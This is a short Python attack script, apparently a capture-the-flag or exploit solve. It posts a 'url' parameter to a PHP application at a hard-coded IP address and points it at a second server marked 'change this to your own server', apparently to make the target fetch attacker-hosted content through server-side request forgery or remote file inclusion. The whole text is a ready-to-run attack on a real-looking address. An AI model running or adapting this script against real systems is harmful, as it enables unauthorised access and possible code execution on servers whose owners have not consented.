import requests

url = "http://34.124.192.13:60087/app/index.php"

r = requests.post(url, data={
    "url": "http://165.22.250.152/index.php" # Change this to your own server
})

print(r.text)